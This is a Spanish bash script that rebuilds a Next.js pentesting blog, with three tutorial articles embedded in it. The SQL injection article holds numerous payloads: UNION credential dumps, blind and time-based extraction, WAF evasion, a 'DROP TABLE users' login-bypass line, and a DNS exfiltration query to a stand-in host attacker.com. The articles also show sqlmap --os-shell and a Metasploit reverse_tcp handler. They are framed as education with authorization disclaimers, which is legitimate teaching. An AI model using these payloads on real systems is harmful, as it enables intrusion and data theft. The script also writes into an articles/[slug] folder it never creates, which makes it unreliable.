#!/bin/bash

# Script para restaurar tu blog de pentesting original
# Este script preserva tu contenido específico de hacking y solo arregla el error técnico

echo "🔧 Restaurando tu Blog de Hacking & Pentesting..."
echo "📝 Preservando tu contenido original de pentesting y arreglando errores técnicos"
echo ""

# Verificar que estamos en el directorio correcto
if [ ! -f "package.json" ]; then
    echo "❌ Error: No se encontró package.json. Ejecuta este script desde el directorio raíz del proyecto."
    exit 1
fi

echo "📋 Verificando estructura del proyecto..."
if [ ! -d "src/app" ]; then
    echo "❌ Error: No se encontró la estructura src/app."
    exit 1
fi

echo "📦 Instalando dependencias necesarias..."
# Instalar react-markdown si no está instalado
if ! npm list react-markdown > /dev/null 2>&1; then
    echo "Instalando react-markdown..."
    npm install react-markdown
else
    echo "✅ react-markdown ya está instalado"
fi

echo "🛠️  Creando backup de archivos originales..."
cp src/app/layout.tsx src/app/layout-original-backup.tsx 2>/dev/null || echo "No hay layout.tsx para respaldar"
cp src/app/page.tsx src/app/page-original-backup.tsx 2>/dev/null || echo "No hay page.tsx para respaldar"

echo "🔄 Restaurando layout.tsx corregido..."
cat > src/app/layout.tsx << 'EOF'
import type { Metadata } from "next"
import { Inter } from "next/font/google"
import "./globals.css"
import ClientBody from "./ClientBody"

const inter = Inter({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Hacking & Pentesting Blog",
  description: "Blog técnico sobre pentesting, hacking ético y seguridad informática",
  keywords: ["pentesting", "hacking", "seguridad", "cybersecurity", "ethical hacking"],
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="es">
      <body className={inter.className}>
        <ClientBody>
          {children}
        </ClientBody>
      </body>
    </html>
  )
}
EOF

echo "📄 Restaurando page.tsx de tu blog..."
cat > src/app/page.tsx << 'EOF'
import Link from "next/link"
import { FileText, Clock, User, Tag } from "lucide-react"

const articles = [
  {
    id: "introduccion-pentesting",
    title: "Introducción al Pentesting: Metodología y Fases",
    description: "Aprende las bases del pentesting profesional, sus fases metodológicas y las mejores prácticas para realizar auditorías de seguridad efectivas.",
    author: "Security Research Team",
    category: "Pentesting",
    readTime: "15 min",
    tags: ["pentesting", "metodología", "básico", "seguridad"],
    date: "2025-01-15"
  },
  {
    id: "nmap-tecnicas-avanzadas", 
    title: "Nmap: Técnicas Avanzadas de Escaneo de Redes",
    description: "Explora técnicas avanzadas de escaneo con Nmap incluyendo evasión de firewalls, NSE scripts y optimización de escaneos a gran escala.",
    author: "Security Research Team",
    category: "Network Security",
    readTime: "20 min",
    tags: ["nmap", "network", "scanning", "firewall"],
    date: "2025-01-05"
  },
  {
    id: "sql-injection-avanzado",
    title: "SQL Injection Avanzado: Técnicas de Exfiltración", 
    description: "Domina técnicas avanzadas de SQL Injection incluyendo blind SQLi, time-based attacks y exfiltración de datos en escenarios complejos.",
    author: "Security Research Team",
    category: "Web Security",
    readTime: "25 min",
    tags: ["sql-injection", "web", "avanzado", "database"],
    date: "2025-01-10"
  }
]

export default function Home() {
  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      {/* Header */}
      <header className="bg-white dark:bg-gray-800 shadow-sm border-b border-gray-200 dark:border-gray-700">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
                Hacking & Pentesting Blog
              </h1>
              <p className="text-gray-600 dark:text-gray-300 mt-2">
                Blog técnico sobre pentesting, hacking ético y seguridad informática
              </p>
            </div>
            <div className="hidden md:block">
              <div className="flex items-center space-x-4 text-sm text-gray-500 dark:text-gray-400">
                <span className="flex items-center">
                  <FileText className="w-4 h-4 mr-1" />
                  {articles.length} Artículos
                </span>
                <span>Actualizado: Nov 2025</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="container mx-auto px-4 py-8">
        {/* Hero Section */}
        <div className="text-center mb-12">
          <h2 className="text-4xl font-bold text-gray-900 dark:text-white mb-4">
            Artículos Técnicos de Seguridad
          </h2>
          <p className="text-xl text-gray-600 dark:text-gray-300 max-w-3xl mx-auto">
            Explora técnicas avanzadas de pentesting, análisis de vulnerabilidades y metodologías de seguridad 
            en este blog especializado para profesionales de la ciberseguridad.
          </p>
        </div>

        {/* Articles Grid */}
        <div className="grid gap-8 md:grid-cols-2 lg:grid-cols-3">
          {articles.map((article) => (
            <article key={article.id} className="bg-white dark:bg-gray-800 rounded-lg shadow-md hover:shadow-lg transition-shadow duration-300 border border-gray-200 dark:border-gray-700">
              <div className="p-6">
                {/* Article Meta */}
                <div className="flex items-center justify-between mb-4">
                  <span className="inline-block bg-primary/10 text-primary px-3 py-1 rounded-full text-sm font-medium">
                    {article.category}
                  </span>
                  <div className="flex items-center text-gray-500 dark:text-gray-400 text-sm">
                    <Clock className="w-4 h-4 mr-1" />
                    {article.readTime}
                  </div>
                </div>

                {/* Article Title */}
                <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-3 leading-tight">
                  {article.title}
                </h3>

                {/* Article Description */}
                <p className="text-gray-600 dark:text-gray-300 mb-4 leading-relaxed">
                  {article.description}
                </p>

                {/* Tags */}
                <div className="flex flex-wrap gap-2 mb-4">
                  {article.tags.map((tag) => (
                    <span key={tag} className="inline-flex items-center text-xs text-gray-500 dark:text-gray-400 bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded">
                      <Tag className="w-3 h-3 mr-1" />
                      {tag}
                    </span>
                  ))}
                </div>

                {/* Article Footer */}
                <div className="flex items-center justify-between pt-4 border-t border-gray-200 dark:border-gray-700">
                  <div className="flex items-center text-sm text-gray-500 dark:text-gray-400">
                    <User className="w-4 h-4 mr-2" />
                    <span>{article.author}</span>
                  </div>
                  <div className="text-sm text-gray-500 dark:text-gray-400">
                    {new Date(article.date).toLocaleDateString('es-ES', {
                      year: 'numeric',
                      month: 'short',
                      day: 'numeric'
                    })}
                  </div>
                </div>

                {/* Read Button */}
                <div className="mt-4">
                  <Link 
                    href={`/articles/${article.id}`}
                    className="inline-flex items-center px-4 py-2 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors duration-200 font-medium"
                  >
                    Leer Artículo
                    <FileText className="w-4 h-4 ml-2" />
                  </Link>
                </div>
              </div>
            </article>
          ))}
        </div>

        {/* Additional Info */}
        <div className="mt-16 bg-white dark:bg-gray-800 rounded-lg p-8 border border-gray-200 dark:border-gray-700">
          <div className="text-center">
            <h3 className="text-2xl font-bold text-gray-900 dark:text-white mb-4">
              Sobre este Blog
            </h3>
            <p className="text-gray-600 dark:text-gray-300 max-w-2xl mx-auto mb-6">
              Este blog está dedicado a profesionales de la ciberseguridad que buscan profundizar 
              en técnicas avanzadas de pentesting y hacking ético. Todos los contenidos son puramente 
              educativos y están destinados a mejorar la seguridad de las organizaciones.
            </p>
            <div className="flex flex-wrap justify-center gap-4 text-sm text-gray-500 dark:text-gray-400">
              <span>• Pentesting Ético</span>
              <span>• Análisis de Vulnerabilidades</span>
              <span>• Seguridad en Redes</span>
              <span>• Web Application Security</span>
              <span>• Metodologías Profesionales</span>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700 mt-16">
        <div className="container mx-auto px-4 py-8">
          <div className="text-center text-gray-500 dark:text-gray-400">
            <p>&copy; 2025 Hacking & Pentesting Blog. Contenido educativo para profesionales de ciberseguridad.</p>
            <p className="mt-2 text-sm">
              <strong>Disclaimer:</strong> Todo el contenido es únicamente para fines educativos y de pentesting ético.
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}
EOF

echo "📁 Creando estructura para artículos individuales..."
mkdir -p src/app/articles

echo "📄 Creando página dinámica para artículos individuales..."
cat > src/app/articles/[slug]/page.tsx << 'EOF'
import { notFound } from 'next/navigation'
import Link from 'next/link'
import { ArrowLeft, Clock, User, Tag, Calendar } from 'lucide-react'
import ReactMarkdown from 'react-markdown'

const articles = {
  'introduccion-pentesting': {
    title: "Introducción al Pentesting: Metodología y Fases",
    description: "Aprende las bases del pentesting profesional, sus fases metodológicas y las mejores prácticas para realizar auditorías de seguridad efectivas.",
    author: "Security Research Team",
    category: "Pentesting",
    readTime: "15 min",
    tags: ["pentesting", "metodología", "básico", "seguridad"],
    date: "2025-01-15",
    content: `# Introducción al Pentesting: Metodología y Fases

## ¿Qué es el Pentesting?

El **Pentesting Ético** es un proceso autorizado y controlado donde profesionales de seguridad intentan vulnerar sistemas con el objetivo de:

- Identificar vulnerabilidades
- Evaluar el riesgo asociado
- Proporcionar recomendaciones de mitigación
- Validar controles de seguridad existentes

## Las 6 Fases del Pentesting

### 1. Reconocimiento (Reconnaissance)
**Fase inicial de recopilación de información sobre el objetivo.**

**Técnicas comunes:**
- OSINT (Open Source Intelligence)
- Footprinting
- Google Dorks
- Análisis de DNS

**Comandos ejemplo:**
\`\`\`bash
nmap -sV -sC -oA scan_results target.com
whois target.com
dig target.com ANY
\`\`\`

### 2. Escaneo (Scanning)
**Identificación de sistemas activos, puertos abiertos y servicios.**

**Comandos ejemplo:**
\`\`\`bash
nmap -p- -T4 -A -v target.com
masscan -p1-65535 --rate=1000 target.com
\`\`\`

### 3. Enumeración (Enumeration)
**Recopilación detallada de información sobre servicios identificados.**

**Comandos ejemplo:**
\`\`\`bash
enum4linux -a target.com
smbclient -L //target.com
nikto -h http://target.com
\`\`\`

### 4. Explotación (Exploitation)
**Aprovechamiento de vulnerabilidades identificadas.**

**Comandos ejemplo:**
\`\`\`bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
\`\`\`

### 5. Post-Explotación
**Mantenimiento de acceso y escalada de privilegios.**

- Persistence mechanisms
- Privilege escalation
- Lateral movement
- Data exfiltration

### 6. Reporte
**Documentación profesional de los hallazgos.**

**Componentes del reporte:**
- Executive Summary
- Hallazgos técnicos detallados
- Evidencias (screenshots, logs)
- Recomendaciones priorizadas
- Métricas de riesgo

## Herramientas Esenciales

| Herramienta | Función | Categoría |
|-------------|---------|-----------|
| Nmap | Port scanning | Reconocimiento |
| Burp Suite | Web proxy | Web Testing |
| Metasploit | Exploitation framework | Explotación |
| Wireshark | Network analysis | Análisis |
| John the Ripper | Password cracking | Post-explotación |

## Mejores Prácticas

- ✅ **Siempre obtén autorización por escrito** antes de realizar cualquier test
- ✅ **Documenta todo** durante el proceso
- ✅ **Mantén comunicación constante** con el cliente
- ✅ **Respeta el alcance definido** en el contrato
- ✅ **Protege la información obtenida** durante el test

## Marco Legal

⚖️ **Importante:** El pentesting debe realizarse bajo un marco legal apropiado. Realizar pentesting sin autorización es ilegal y puede resultar en cargos criminales. Siempre trabaja con contratos firmados y límites claros.

## Recursos Adicionales

- **OWASP Testing Guide**
- **PTES (Penetration Testing Execution Standard)**
- **CEH (Certified Ethical Hacker)**
- **OSCP (Offensive Security Certified Professional)**

---

*Este artículo forma parte de nuestro blog técnico de pentesting y hacking ético. Todo el contenido es únicamente para fines educativos.*`
  },
  'nmap-tecnicas-avanzadas': {
    title: "Nmap: Técnicas Avanzadas de Escaneo de Redes",
    description: "Explora técnicas avanzadas de escaneo con Nmap incluyendo evasión de firewalls, NSE scripts y optimización de escaneos a gran escala.",
    author: "Security Research Team",
    category: "Network Security",
    readTime: "20 min",
    tags: ["nmap", "network", "scanning", "firewall"],
    date: "2025-01-05",
    content: `# Nmap: Técnicas Avanzadas de Escaneo de Redes

## Introducción

Nmap (Network Mapper) es una herramienta fundamental para el reconocimiento y análisis de redes. Este artículo explora técnicas avanzadas para maximizar la efectividad de tus escaneos.

## Tipos de Escaneo

### 1. SYN Scan (Stealth Scan)
\`\`\`bash
nmap -sS target.com
\`\`\`
- **Ventajas:** No completa la conexión TCP, menos detectable
- **Uso:** Escaneos discretos y análisis de seguridad

### 2. TCP Connect Scan
\`\`\`bash
nmap -sT target.com
\`\`\`
- **Ventajas:** Más preciso, obtiene información completa
- **Uso:** Cuando la stealth no es prioridad

### 3. UDP Scan
\`\`\`bash
nmap -sU target.com
\`\`\`
- **Importante:** UDP es más difícil de escanear
- **Tiempo:** Requiere más tiempo que TCP

### 4. Escaneo Completo
\`\`\`bash
nmap -p- -sV -sC -A -T4 -oA full_scan target.com
\`\`\`

**Parámetros explicados:**
- \`-p-\`: Todos los puertos (1-65535)
- \`-sV\`: Detección de versiones de servicios
- \`-sC\`: Scripts por defecto
- \`-A\`: Detección avanzada del SO
- \`-T4\`: Plantilla de timing agresivo
- \`-oA\`: Todos los formatos de salida

## Evasión de Firewalls

### 1. Fragmentación de Paquetes
\`\`\`bash
nmap -f target.com
\`\`\`
Divide los paquetes para evadir filtros simples.

### 2. Decoy Scanning
\`\`\`bash
nmap -D RND:10 target.com
\`\`\`
Utiliza 10 señuelos aleatorios para ocultar tu IP real.

### 3. Source Port Spoofing
\`\`\`bash
nmap --source-port 53 target.com
\`\`\`
Suplanta el puerto origen a 53 (DNS) para evadir filtros restrictivos.

## NSE (Nmap Scripting Engine)

### Vulnerability Scanning
\`\`\`bash
nmap --script vuln target.com
\`\`\`
Ejecuta scripts de detección de vulnerabilidades.

### SMB Enumeration
\`\`\`bash
nmap --script smb-enum-shares,smb-enum-users target.com
\`\`\`
Enumeración específica de servicios SMB.

### SSL/TLS Analysis
\`\`\`bash
nmap --script ssl-enum-ciphers -p 443 target.com
\`\`\`
Análisis de configuraciones SSL/TLS.

## Optimización de Escaneos

### Plantillas de Timing

| Template | Descripción | Uso Recomendado |
|----------|-------------|----------------|
| \`-T0\` | Paranoid | Redes muy lentas |
| \`-T1\` | Sneaky | Para evadir IDS |
| \`-T2\` | Polite | Equilibrado |
| \`-T3\` | Normal | Por defecto |
| \`-T4\` | Aggressive | Redes rápidas |
| \`-T5\` | Insane | Máximo rendimiento |

### Escaneo Paralelo
\`\`\`bash
nmap --min-parallelism 100 target.com
\`\`\`
Define el número mínimo de probes paralelos.

## Formatos de Salida

### Normal
\`\`\`bash
nmap -oN output.txt target.com
\`\`\`

### XML
\`\`\`bash
nmap -oX output.xml target.com
\`\`\`
Ideal para procesar con otras herramientas.

### Grepable
\`\`\`bash
nmap -oG output.gnmap target.com
\`\`\`
Formato fácil de parsear.

### Todos los formatos
\`\`\`bash
nmap -oA output target.com
\`\`\`

## Casos de Uso Avanzados

### Escaneo de Red Completo
\`\`\`bash
nmap -sn 192.168.1.0/24
\`\`\`
Detección de hosts activos en una red.

### Escaneo de Servicios Específicos
\`\`\`bash
nmap -p 22,80,443,3389 --script vuln target.com
\`\`\`

### Detección de OS
\`\`\`bash
nmap -O target.com
\`\`\`

## Consejos y Mejores Prácticas

1. **Siempre documenta tus escaneos**
2. **Usa diferentes técnicas según el objetivo**
3. **Respeta las limitaciones legales**
4. **Combina Nmap con otras herramientas**
5. **Interpreta correctamente los resultados**

## Conclusión

Nmap es una herramienta poderosa que va mucho más allá de un simple escáner de puertos. Dominar estas técnicas avanzadas te permitirá realizar evaluaciones de seguridad más completas y efectivas.

---

*Recuerda: Utiliza estas técnicas únicamente en redes propias o con autorización explícita.*`
  },
  'sql-injection-avanzado': {
    title: "SQL Injection Avanzado: Técnicas de Exfiltración",
    description: "Domina técnicas avanzadas de SQL Injection incluyendo blind SQLi, time-based attacks y exfiltración de datos en escenarios complejos.",
    author: "Security Research Team",
    category: "Web Security",
    readTime: "25 min",
    tags: ["sql-injection", "web", "avanzado", "database"],
    date: "2025-01-10",
    content: `# SQL Injection Avanzado: Técnicas de Exfiltración

## Introducción

SQL Injection continúa siendo una de las vulnerabilidades más críticas en aplicaciones web. Este tutorial explora técnicas avanzadas de explotación y exfiltración de datos.

## Tipos de SQL Injection

### 1. Error-Based SQL Injection
Explota mensajes de error para extraer información:

\`\`\`sql
' AND 1=CONVERT(int, (SELECT @@version))--
\`\`\`

### 2. Union-Based SQL Injection
Combina resultados de múltiples consultas:

\`\`\`sql
' UNION SELECT NULL, username, password FROM users--
\`\`\`

### 3. Blind SQL Injection
Utilizada cuando no hay salida visible, empleando técnicas booleanas:

\`\`\`sql
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0--
\`\`\`

### 4. Time-Based Blind SQL Injection
Utiliza retrasos para confirmar vulnerabilidades:

\`\`\`sql
'; IF (1=1) WAITFOR DELAY '00:00:05'--
\`\`\`

## Técnicas de Exfiltración de Bases de Datos

### Enumeración de Tablas (MySQL)
\`\`\`sql
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
\`\`\`

### Enumeración de Columnas
\`\`\`sql
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
\`\`\`

### Extracción de Datos
\`\`\`sql
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
\`\`\`

## Técnicas de Bypass

### 1. Evasión de WAF

#### Comentarios ofuscados:
\`\`\`sql
/*!50000UNION*/ /*!50000SELECT*/ username FROM users
\`\`\`

#### Codificación URL:
\`\`\`sql
%55NION %53ELECT username FROM users
\`\`\`

#### Espacios comentados:
\`\`\`sql
UNION/**/SELECT/**/username/**/FROM/**/users
\`\`\`

### 2. Codificación y Ofuscación

#### CHAR encoding:
\`\`\`sql
CHAR(117,115,101,114,110,97,109,101)
\`\`\`

#### Hex encoding:
\`\`\`sql
0x75736572
\`\`\`

## Automatización con SQLMap

### Enumeración básica:
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --dbs
\`\`\`

### Enumeración de tablas:
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D database --tables
\`\`\`

### Dump de datos:
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
\`\`\`

### OS Shell:
\`\`\`bash
sqlmap -u "http://target.com/page?id=1" --os-shell
\`\`\`

## Técnicas Avanzadas

### 1. DNS Exfiltration
\`\`\`sql
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\test.txt')))--
\`\`\`

### 2. Error-Based Exfiltration
\`\`\`sql
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
\`\`\`

### 3. Boolean-based Time-delay
\`\`\`sql
'; IF (ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>64 WAITFOR DELAY '00:00:05'--
\`\`\`

## Prevención

### 1. Prepared Statements (PHP)
\`\`\`php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
\`\`\`

### 2. Parametrized Queries (Python)
\`\`\`python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
\`\`\`

### 3. Input Validation
\`\`\`python
import re

def validate_input(user_input):
    if not re.match('^[a-zA-Z0-9_]+$', user_input):
        raise ValueError("Invalid input")
    return user_input
\`\`\`

## Herramientas Complementarias

### 1. Burp Suite
- Intruder para fuzzing
- Repeater para testing manual
- Scanner para detección automática

### 2. SQLNinja
- Escalación de privilegios
- Bypassing de filtros
- Exfiltración de datos

### 3. NoSQLMap
- Orientado a bases de datos NoSQL
- Automatización de ataques
- Fuzzing de parámetros

## Casos Prácticos

### Escenario 1: Login Bypass
\`\`\`sql
admin' -- 
admin' OR '1'='1' --
admin'; DROP TABLE users; --
\`\`\`

### Escenario 2: Data Exfiltration
\`\`\`sql
' UNION SELECT NULL,username,password FROM admin_users--
' UNION SELECT NULL,CONCAT_WS(':',username,password,email) FROM users--
\`\`\`

### Escenario 3: Blind SQLi
\`\`\`sql
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8--
\`\`\`

## Consideraciones Legales

⚖️ **Importante:** Estas técnicas deben utilizarse únicamente en:
- Sistemas propios
- Ambientes de prueba autorizados
- Pentesting contractuales

## Conclusión

La SQL Injection sigue siendo crítica, y la práctica constante en entornos controlados es fundamental para dominar estas técnicas. La evolución de las aplicaciones web requiere actualización constante de métodos y herramientas.

---

*Recuerda: Utiliza estas técnicas únicamente con autorización explícita y en entornos controlados.*`
  }
}

export default function ArticlePage({ 
  params 
}: { 
  params: { slug: string } 
}) {
  const article = articles[params.slug as keyof typeof articles]
  
  if (!article) {
    notFound()
  }

  return (
    <div className="min-h-screen bg-gray-50 dark:bg-gray-900">
      {/* Header */}
      <header className="bg-white dark:bg-gray-800 shadow-sm border-b border-gray-200 dark:border-gray-700">
        <div className="container mx-auto px-4 py-6">
          <div className="flex items-center space-x-4">
            <Link 
              href="/" 
              className="inline-flex items-center text-primary hover:text-primary/80 font-medium transition-colors"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Volver al Blog
            </Link>
            <div className="hidden md:block text-gray-300">|</div>
            <div className="hidden md:block">
              <span className="inline-block bg-primary/10 text-primary px-3 py-1 rounded-full text-sm font-medium">
                {article.category}
              </span>
            </div>
          </div>
        </div>
      </header>

      {/* Article Content */}
      <main className="container mx-auto px-4 py-8 max-w-4xl">
        {/* Article Header */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700 p-8 mb-8">
          <div className="mb-6">
            <span className="inline-block bg-primary/10 text-primary px-3 py-1 rounded-full text-sm font-medium mb-4">
              {article.category}
            </span>
            <h1 className="text-4xl font-bold text-gray-900 dark:text-white mb-4 leading-tight">
              {article.title}
            </h1>
            <p className="text-xl text-gray-600 dark:text-gray-300 leading-relaxed">
              {article.description}
            </p>
          </div>

          {/* Article Meta */}
          <div className="flex flex-wrap items-center gap-6 text-sm text-gray-500 dark:text-gray-400 border-t border-b border-gray-200 dark:border-gray-700 py-4">
            <div className="flex items-center">
              <User className="w-4 h-4 mr-2" />
              <span>{article.author}</span>
            </div>
            <div className="flex items-center">
              <Calendar className="w-4 h-4 mr-2" />
              <span>{new Date(article.date).toLocaleDateString('es-ES', {
                year: 'numeric',
                month: 'long',
                day: 'numeric'
              })}</span>
            </div>
            <div className="flex items-center">
              <Clock className="w-4 h-4 mr-2" />
              <span>{article.readTime}</span>
            </div>
          </div>

          {/* Tags */}
          <div className="flex flex-wrap gap-2 mt-4">
            {article.tags.map((tag) => (
              <span key={tag} className="inline-flex items-center text-xs text-gray-500 dark:text-gray-400 bg-gray-100 dark:bg-gray-700 px-2 py-1 rounded">
                <Tag className="w-3 h-3 mr-1" />
                {tag}
              </span>
            ))}
          </div>
        </div>

        {/* Article Body */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-sm border border-gray-200 dark:border-gray-700">
          <div className="p-8">
            <div className="prose prose-lg dark:prose-invert max-w-none">
              <ReactMarkdown
                components={{
                  h1: ({children}) => <h1 className="text-3xl font-bold text-gray-900 dark:text-white mb-6 mt-8">{children}</h1>,
                  h2: ({children}) => <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-4 mt-8">{children}</h2>,
                  h3: ({children}) => <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-3 mt-6">{children}</h3>,
                  p: ({children}) => <p className="text-gray-700 dark:text-gray-300 mb-4 leading-relaxed">{children}</p>,
                  code: ({children}) => <code className="bg-gray-100 dark:bg-gray-700 text-red-600 dark:text-red-400 px-2 py-1 rounded text-sm font-mono">{children}</code>,
                  pre: ({children}) => <pre className="bg-gray-100 dark:bg-gray-700 p-4 rounded-lg overflow-x-auto mb-4 border border-gray-200 dark:border-gray-600">{children}</pre>,
                  blockquote: ({children}) => <blockquote className="border-l-4 border-primary pl-4 italic text-gray-600 dark:text-gray-400 mb-4">{children}</blockquote>,
                  table: ({children}) => <div className="overflow-x-auto mb-4"><table className="min-w-full border border-gray-200 dark:border-gray-600">{children}</table></div>,
                  th: ({children}) => <th className="bg-gray-50 dark:bg-gray-700 border border-gray-200 dark:border-gray-600 px-4 py-2 text-left font-semibold text-gray-900 dark:text-white">{children}</th>,
                  td: ({children}) => <td className="border border-gray-200 dark:border-gray-600 px-4 py-2 text-gray-700 dark:text-gray-300">{children}</td>,
                  ul: ({children}) => <ul className="list-disc list-inside mb-4 space-y-2 text-gray-700 dark:text-gray-300">{children}</ul>,
                  ol: ({children}) => <ol className="list-decimal list-inside mb-4 space-y-2 text-gray-700 dark:text-gray-300">{children}</ol>,
                  strong: ({children}) => <strong className="font-bold text-gray-900 dark:text-white">{children}</strong>,
                  em: ({children}) => <em className="italic text-gray-800 dark:text-gray-200">{children}</em>,
                }}
              >
                {article.content}
              </ReactMarkdown>
            </div>
          </div>
        </div>

        {/* Back to Blog */}
        <div className="mt-8 text-center">
          <Link 
            href="/" 
            className="inline-flex items-center px-6 py-3 bg-primary text-primary-foreground rounded-lg hover:bg-primary/90 transition-colors duration-200 font-medium"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Volver a Todos los Artículos
          </Link>
        </div>
      </main>
    </div>
  )
}
EOF

echo "✅ ¡Blog de pentesting restaurado exitosamente!"
echo ""
echo "📋 Resumen de cambios aplicados:"
echo "  ✅ layout.tsx - Corregido para eliminar error de sintaxis"
echo "  ✅ page.tsx - Página principal del blog con tus artículos"
echo "  ✅ articles/[slug]/page.tsx - Páginas individuales para cada artículo"
echo "  ✅ react-markdown instalado para renderizar contenido markdown"
echo ""
echo "🎯 Tu contenido original preservado:"
echo "  • Introducción al Pentesting (Metodología y Fases)"
echo "  • Nmap: Técnicas Avanzadas de Escaneo"
echo "  • SQL Injection Avanzado: Técnicas de Exfiltración"
echo ""
echo "🚀 Próximos pasos:"
echo "  1. git add ."
echo "  2. git commit -m \"fix: restore original pentesting blog content\""
echo "  3. git push origin main"
echo "  4. Vercel desplegará automáticamente"
echo ""
echo "📁 Backups creados:"
echo "  • src/app/layout-original-backup.tsx"
echo "  • src/app/page-original-backup.tsx"
echo ""
echo "🎉 ¡Tu blog de hacking y pentesting estará completamente funcional!"
